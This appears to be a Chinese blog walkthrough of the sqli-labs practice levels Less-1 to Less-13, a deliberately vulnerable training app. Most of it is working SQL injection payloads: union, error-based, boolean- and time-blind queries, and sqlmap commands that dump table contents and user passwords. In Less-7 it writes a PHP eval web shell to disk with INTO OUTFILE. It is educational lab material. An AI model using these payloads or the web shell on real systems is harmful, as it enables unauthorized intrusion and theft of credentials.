id="union联合注入（Less-1-Less-4-GET）"><a href="#union联合注入（Less-1-Less-4-GET）" class="headerlink" title="union联合注入（Less-1~Less-4 GET）"></a>union联合注入（Less-1~Less-4 GET）</h1><h3 id="Get注入"><a href="#Get注入" class="headerlink" title="Get注入"></a>Get注入</h3><p>Get方式不能使用#，抓包会发现#会消失不见，可用%23代替。也可以用–+。</p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>输入单引号，出现报错。输入两个单引号不报错。</p><pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">''</span>1<span class="token string">''</span> LIMIT 0,1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：’1’’</p><p>则在源码中可能为 id=’$id’ </p><p>可以成功注入的有：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1'or 1<span class="token operator">=</span>1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时构造的sql语句就为：</p><pre class="line-numbers language-bash"><code class="language-bash">select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token string">'1'</span> or 1<span class="token operator">=</span>1 --+' LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="（1）用order-by判断有几个字段"><a href="#（1）用order-by判断有几个字段" class="headerlink" title="（1）用order by判断有几个字段"></a>（1）用order by判断有几个字段</h4><p>order by就是如果到n出错，则字段数为n-1。</p><p>当构造?id=1’ order by 4–+时会报错，则说明字段数为3。</p><img src="/posts/bb32/1.png" class><h4 id="（2）判断回显点"><a href="#（2）判断回显点" class="headerlink" title="（2）判断回显点"></a>（2）判断回显点</h4><p>构造?id=1’ union select 1,2,3–+</p><p>当id的数据在数据库中不存在时，此时我们可以id=-1，两个sql语句进行联合操作时，当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来。</p><p>此处前台页面返回了我们构造的union的数据。可以看到回显点是2和3。  </p><img src="/posts/bb32/1_2.png" class><h4 id="（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西"><a href="#（3）因此，我们可以在2-3回显的位置构造sql查询语句查询我们想要的东西" class="headerlink" title="（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西"></a>（3）因此，我们可以在2,3回显的位置构造sql查询语句查询我们想要的东西</h4><h3 id="1-1获取数据库"><a href="#1-1获取数据库" class="headerlink" title="1.1获取数据库"></a>1.1获取数据库</h3><h4 id="①获取单个数据库名"><a href="#①获取单个数据库名" class="headerlink" title="①获取单个数据库名"></a>①获取单个数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到数据库名为security</p><img src="/posts/bb32/1_3.png" class><h4 id="②获得所有数据库名"><a href="#②获得所有数据库名" class="headerlink" title="②获得所有数据库名"></a>②获得所有数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span> from information_schema.schemata--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可获取所有的数据库：</p><p> <img src="/posts/bb32/1_4.png" class></p><h3 id="1-2获取表格"><a href="#1-2获取表格" class="headerlink" title="1.2获取表格"></a>1.2获取表格</h3><h4 id="①得到单个表格"><a href="#①得到单个表格" class="headerlink" title="①得到单个表格"></a>①得到单个表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select table_name from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> limit 0,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到表为emails：</p><p> <img src="/posts/bb32/1_5.png" class></p><h4 id="②得到所有表格"><a href="#②得到所有表格" class="headerlink" title="②得到所有表格"></a>②得到所有表格</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可得到所有的表：</p><p> <img src="/posts/bb32/1_6.png" class></p><h3 id="1-3获取字段名"><a href="#1-3获取字段名" class="headerlink" title="1.3获取字段名"></a>1.3获取字段名</h3><h4 id="①获得单个字段名"><a href="#①获得单个字段名" class="headerlink" title="①获得单个字段名"></a>①获得单个字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,(select column_name from information_schema.columns where table_name='</span>users' limit 0,1<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到字段名user_id：</p><p> <img src="/posts/bb32/1_7.png" class></p><h4 id="②获得所有字段名"><a href="#②获得所有字段名" class="headerlink" title="②获得所有字段名"></a>②获得所有字段名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>users' --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可查到所有字段名:</p><p> <img src="/posts/bb32/1_8.png" class></p><h3 id="1-4获取表格里面的内容"><a href="#1-4获取表格里面的内容" class="headerlink" title="1.4获取表格里面的内容"></a>1.4获取表格里面的内容</h3><h4 id="①获得单个用户名和密码"><a href="#①获得单个用户名和密码" class="headerlink" title="①获得单个用户名和密码"></a>①获得单个用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> 1,2,group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> where id<span class="token operator">=</span>2--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>可以得到用户名为Angelina,密码为：I-kill-you</p><p> <img src="/posts/bb32/1_9.png" class></p><h4 id="②获得所有的用户名和密码"><a href="#②获得所有的用户名和密码" class="headerlink" title="②获得所有的用户名和密码"></a>②获得所有的用户名和密码</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(username,0x3a,password) from users--+或者id=-1'</span> union <span class="token keyword">select</span> 1,2,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x3a,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit 0,1<span class="token punctuation">)</span> --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可得到所有的用户名和密码。</p><p> <img src="/posts/bb32/1_10.png" class></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>输入1’</p><pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">''</span> LIMIT 0,1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：’</p><p>则在源码中可能为 id=$id</p><p>可以成功注入的有：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1 or 1<span class="token operator">=</span>1id<span class="token operator">=</span>1 or 1<span class="token operator">=</span>1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>此时构造的sql语句就为：</p><pre class="line-numbers language-bash"><code class="language-bash">select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span>1 or 1<span class="token operator">=</span>1 LIMIT 0,1或select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span>1 or 1<span class="token operator">=</span>1 --+ LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>其余的payload与less-1中一样，只需要将less-1的’去掉即可。</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>输入1’</p><pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">''</span>1<span class="token string">''</span><span class="token punctuation">)</span> LIMIT 0,1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：’1’’)</p><p>则在源码中可能为 id=(‘$id’) </p><p>可以成功注入的有：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">') or ('</span>1<span class="token string">'='</span>1id<span class="token operator">=</span>1<span class="token string">' or '</span>1<span class="token string">'='</span>1id<span class="token operator">=</span>1<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时构造的sql语句就为：</p><pre class="line-numbers language-bash"><code class="language-bash">select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> or <span class="token punctuation">(</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">)</span> LIMIT 0,1或select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'1'</span> or <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">)</span> LIMIT 0,1或select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'1) or 1=1 --+'</span><span class="token punctuation">)</span> LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其余的payload与less-1中一样，只需要将less-1中的’更换为’)</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>输入1”</p><pre class="line-numbers language-bash"><code class="language-bash">错误信息：<span class="token string">'"1"") LIMIT 0,1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：”1””)</p><p>则在源码中可能为 (“$id”)</p><p>可以成功的注入有：</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">" or "</span>1<span class="token string">"="</span>1id<span class="token operator">=</span>1<span class="token string">") or ("</span>1<span class="token string">"="</span>1id<span class="token operator">=</span>1<span class="token string">") or "</span>1<span class="token string">"=("</span>1id<span class="token operator">=</span>1"<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时构造的sql语句就为：</p><pre class="line-numbers language-bash"><code class="language-bash">select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"1"</span> or <span class="token string">"1"</span><span class="token operator">=</span>”1<span class="token string">") LIMIT 0,1或select......id=("</span>1<span class="token string">") or (”1"</span><span class="token operator">=</span>”1<span class="token string">") LIMIT 0,1或select......id=(“1"</span><span class="token punctuation">)</span> or <span class="token string">"1”=("</span>1”<span class="token punctuation">)</span> LIMIT 0,1或select<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span> or 1<span class="token operator">=</span>1 --+"<span class="token punctuation">)</span> LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其余的payload与less-1中一样，只需要将less-1中的’更换为”)</p><h1 id="盲注-Less-5-Less-10-GET"><a href="#盲注-Less-5-Less-10-GET" class="headerlink" title="盲注(Less-5~Less-10 GET)"></a>盲注(Less-5~Less-10 GET)</h1><p>盲注有三种，分别是：</p><p>（1）boolean布尔型盲注</p><p>（2）报错注入</p><p>（3）时间注入（延时注入，基于时间的sql盲注）</p><h2 id="Less-5-基于布尔型的盲注"><a href="#Less-5-基于布尔型的盲注" class="headerlink" title="Less-5 基于布尔型的盲注"></a>Less-5 基于布尔型的盲注</h2><p>输入单引号判断之后，构造id=1’ or ‘1’=’1</p><p>发现页面只会显示对与错的信息，不会显示数据库的信息，此关可以采用盲注。</p><h3 id="（1）可以使用延时注入："><a href="#（1）可以使用延时注入：" class="headerlink" title="（1）可以使用延时注入："></a>（1）可以使用延时注入：</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1' and sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>发现网络延时五秒响应，可以用延时注入：</p><p> <img src="/posts/bb32/5.png" class></p><h3 id="（2）可以使用报错注入："><a href="#（2）可以使用报错注入：" class="headerlink" title="（2）可以使用报错注入："></a>（2）可以使用报错注入：</h3><p>输入单引号，发现出现报错信息，因此可以使用报错注入。</p><h4 id="①得到库"><a href="#①得到库" class="headerlink" title="①得到库"></a>①得到库</h4><pre class="line-numbers language-bash"><code class="language-bash">可以使用这个payload：id<span class="token operator">=</span>1' and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会报错显示当前库不存在这个函数，所以数据库名可以看到为security：</p><p>  <img src="/posts/bb32/5_2.png" class></p><p>当然也可以直接构造payload:</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样得到数据库名为security：</p><p>  <img src="/posts/bb32/5_3.png" class></p><h4 id="②获取用户名"><a href="#②获取用户名" class="headerlink" title="②获取用户名"></a>②获取用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到数据库用户名为root@localhost：</p><p>  <img src="/posts/bb32/5_4.png" class></p><h3 id="（3）下面采用的是基于布尔型的盲注："><a href="#（3）下面采用的是基于布尔型的盲注：" class="headerlink" title="（3）下面采用的是基于布尔型的盲注："></a>（3）下面采用的是基于布尔型的盲注：</h3><h3 id="5-1获取敏感信息"><a href="#5-1获取敏感信息" class="headerlink" title="5.1获取敏感信息"></a>5.1获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">构造payload:id<span class="token operator">=</span>1<span class="token string">' and if(substr(database(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将’a’可替换成其他字母，进行判断，如果正确会显示下图：</p><p>  <img src="/posts/bb32/5_5.png" class></p><p>不正确则会显示下图：</p><p>  <img src="/posts/bb32/5_6.png" class></p><p>根据对与错来判断输入字符的正确性。</p><p>这里我采用抓包然后进行爆破，可得到数据库名为：security(写成大写也可以）</p><p> <img src="/posts/bb32/5_7.png" class></p><h3 id="5-2获取表名"><a href="#5-2获取表名" class="headerlink" title="5.2获取表名"></a>5.2获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:id<span class="token operator">=</span>1<span class="token string">' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里同样利用burp抓包，然后对标红的两个变量进行爆破，可得到表名为emails</p><p>  <img src="/posts/bb32/5_8.png" class></p><p>并且将limit 0,1改成如limit 1,1可获取其他数据库，分别为referers,uagents,users</p><h3 id="5-3获取字段名"><a href="#5-3获取字段名" class="headerlink" title="5.3获取字段名"></a>5.3获取字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and if(substr((select column_name from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>同样用burp抓包，得到字段名为user_id：</p><p>  <img src="/posts/bb32/5_9.png" class></p><p>将limit 0,1改成其他行，可获得其他列名为username,password,等等。</p><h3 id="5-4获取表里面的内容"><a href="#5-4获取表里面的内容" class="headerlink" title="5.4获取表里面的内容"></a>5.4获取表里面的内容</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and if(substr((select concat(username,0x3a,password) from users limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>用burp抓包，得到用户名和密码为：dumb:dumb</p><p>  <img src="/posts/bb32/5_10.png" class></p><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>本关也为盲注。 通过输入单引号不报错，输入双引号报错，可推断源码中参数可能为 “$id”</p><p>所以本关的解法跟Less-5一样，只需将第五关的单引号改成双引号即可。</p><h2 id="Less-7文件导入注入"><a href="#Less-7文件导入注入" class="headerlink" title="Less-7文件导入注入"></a>Less-7文件导入注入</h2><p>本关是利用文件导入的方式进行注入。</p><p>构造payload:</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1'<span class="token punctuation">))</span> union <span class="token keyword">select</span> 1,2,3 into outfile  <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.txt"</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>虽然显示报错信息，但在路径下已经生成了1.txt</p><p>  <img src="/posts/bb32/7.png" class></p><p>可以直接将一句话木马导入进去</p><p>构造payload:</p><pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1<span class="token string">')) union select 1,2,'</span><span class="token operator">&lt;</span>?php eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span> ' into outfile  <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php"</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后可以利用工具连接。</p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>通过测试，id=1’ or 1=1–+是显示正确的。这关跟第五关一样，可以使用基于布尔型的盲注，以及延时注入。但是不能使用报错注入。</p><p>因为在源码中将将 mysql 报错的语句进行了注释。</p><p>  <img src="/posts/bb32/8.png" class></p><p>其余的payload跟第五关的一样啦。</p><h2 id="Less-9-基于时间的sql盲注（采用sqlmap）"><a href="#Less-9-基于时间的sql盲注（采用sqlmap）" class="headerlink" title="Less-9 基于时间的sql盲注（采用sqlmap）"></a>Less-9 基于时间的sql盲注（采用sqlmap）</h2><p>本关可采用时间延迟的注入。</p><h3 id="（1）方法一："><a href="#（1）方法一：" class="headerlink" title="（1）方法一："></a>（1）方法一：</h3><p>测试：id=1’ and sleep(5)–+</p><p>查看网络状态，的确存在延时。</p><h4 id="①获得数据库名"><a href="#①获得数据库名" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：id<span class="token operator">=</span>1<span class="token string">' and if(substr(database(),1,1)='</span>s',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看网络是否延时五秒，是则说明字符正确，不是则说明错误。</p><p>将标红的1依次替换，可得到数据库名为security。</p><p>  <img src="/posts/bb32/9.png" class></p><h4 id="②获得表名"><a href="#②获得表名" class="headerlink" title="②获得表名"></a>②获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:http://127.0.0.1:8099/sqli/Less-9/?id<span class="token operator">=</span>1<span class="token string">' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span>e',sleep<span class="token punctuation">(</span>5<span class="token punctuation">)</span>,0<span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>查看响应，依次类推，得到表名为emails,referers,uagents,users</p><h3 id="（2）方法二："><a href="#（2）方法二：" class="headerlink" title="（2）方法二："></a>（2）方法二：</h3><p>我们这里采用sqlmap来检测时间注入</p><h3 id="9-1判断注入"><a href="#9-1判断注入" class="headerlink" title="9.1判断注入"></a>9.1判断注入</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>sqlmap检测到为时间注入：</p><p> <img src="/posts/bb32/9_2.png" class></p><h3 id="9-2获取敏感信息"><a href="#9-2获取敏感信息" class="headerlink" title="9.2获取敏感信息"></a>9.2获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --current-user --current-db --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(–current-user为获取用户，–current-db为获取数据库名， –batch表示使用自动模式，默认为y)</p><p>获得当前数据库用户名为root@localhost，数据库名为：security</p><p> <img src="/posts/bb32/9_3.png" class></p><h3 id="9-3获取表"><a href="#9-3获取表" class="headerlink" title="9.3获取表"></a>9.3获取表</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --tables -D security --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(-D 指定数据库 –tables 获取表)</p><p>得到表名为emails,referers,uagents,users：</p><p> <img src="/posts/bb32/9_4.png" class></p><h3 id="9-4获取字段"><a href="#9-4获取字段" class="headerlink" title="9.4获取字段"></a>9.4获取字段</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --columns -T <span class="token function">users</span> -D security --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(–columns获取字段)</p><p>得到字段名为id,username,password：</p><p> <img src="/posts/bb32/9_5.png" class></p><h3 id="9-5查询账号和密码"><a href="#9-5查询账号和密码" class="headerlink" title="9.5查询账号和密码"></a>9.5查询账号和密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T --dump -C <span class="token string">"id,username,password"</span> -T <span class="token function">users</span> -D security --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>(–dump是导出数据，-C是指定查询的字段)</p><p>得到账户密码为：</p><p> <img src="/posts/bb32/9_6.png" class></p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>本关跟第九关一样，只需将第九关的单引号换成双引号即可。</p><h1 id="union联合注入（Less-11-Less-12-POST）"><a href="#union联合注入（Less-11-Less-12-POST）" class="headerlink" title="union联合注入（Less-11~Less-12 POST）"></a>union联合注入（Less-11~Less-12 POST）</h1><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>不能使用–+注释符,因为抓包发现加号被编码成%2B了。</p><p>可以用#，减减空格（空格被编码成了+）</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>在username的输入框输入：1’ </p><p>出现如下报错信息：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">''</span>1<span class="token string">''</span> and password<span class="token operator">=</span><span class="token string">''</span> LIMIT 0,1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：’1’’</p><p>在源码中可能为 username=’$uname’</p><p>在Less-11的index.php中：</p><pre class="line-numbers language-bash"><code class="language-bash">@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT username, password FROM users WHERE username='<span class="token variable">$uname</span>' and password='<span class="token variable">$passwd</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试：1’ or 1=1#</p><p>可以登录成功：</p><p> <img src="/posts/bb32/11.png" class></p><h3 id="11-1获取用户名"><a href="#11-1获取用户名" class="headerlink" title="11.1获取用户名"></a>11.1获取用户名</h3><p>①payload:</p><p>在username的输入框输入：</p><pre class="line-numbers language-bash"><code class="language-bash">1' union <span class="token keyword">select</span> 1,user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到当前数据库用户名为root@localhost:</p><p>  <img src="/posts/bb32/11_2.png" class></p><p>或者：</p><p>②payload：</p><p>在username的输入框输入：</p><pre class="line-numbers language-bash"><code class="language-bash">1' and <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="11-2获取数据库名"><a href="#11-2获取数据库名" class="headerlink" title="11.2获取数据库名"></a>11.2获取数据库名</h3><p>payload:</p><p>在username的输入框输入：</p><pre class="line-numbers language-bash"><code class="language-bash">1' union <span class="token keyword">select</span> 1,database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到数据库名为security:</p><p>   <img src="/posts/bb32/11_3.png" class></p><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>通过测试，输入1”可以看到报错信息。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'"1"") and password=("") LIMIT 0,1'</span> at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：在源代码中可能为username=(“$uname”)的形式。</p><p>使用payload:</p><pre class="line-numbers language-bash"><code class="language-bash">1"<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到页面返回正确的信息。</p><p>其他的payload就跟十一关差不多，只需要将十一关的’改为”)即可。</p><h1 id="盲注（Less-13-Less-17-POST）"><a href="#盲注（Less-13-Less-17-POST）" class="headerlink" title="盲注（Less-13~Less-17 POST）"></a>盲注（Less-13~Less-17 POST）</h1><h2 id="Less-13-基于布尔型的盲注"><a href="#Less-13-基于布尔型的盲注" class="headerlink" title="Less-13 基于布尔型的盲注"></a>Less-13 基于布尔型的盲注</h2><p>输入1’，出现如下错误信息提示：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">''</span>1<span class="token string">''</span><span class="token punctuation">)</span> and password<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span> LIMIT 0,1' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明:在源代码中可能为username=(‘$uname’)的形式。</p><pre class="line-numbers language-bash"><code class="language-bash">使用payload：1'<span class="token punctuation">)</span> or 1<span class="token operator">=</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面出现成功提示，但是不像第十一关和第十二关那样出现用户的账号和密码。</p><h3 id="（1）可以采用基于布尔型的盲注"><a href="#（1）可以采用基于布尔型的盲注" class="headerlink" title="（1）可以采用基于布尔型的盲注"></a>（1）可以采用基于布尔型的盲注</h3><h4 id="猜测当前数据库用户名："><a href="#猜测当前数据库用户名：" class="headerlink" title="猜测当前数据库用户名："></a>猜测当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:1<span class="token string">') or if(substr(user(),1,1)='</span>r<span class="token string">',1,0)#或者可用like匹配：1'</span><span class="token 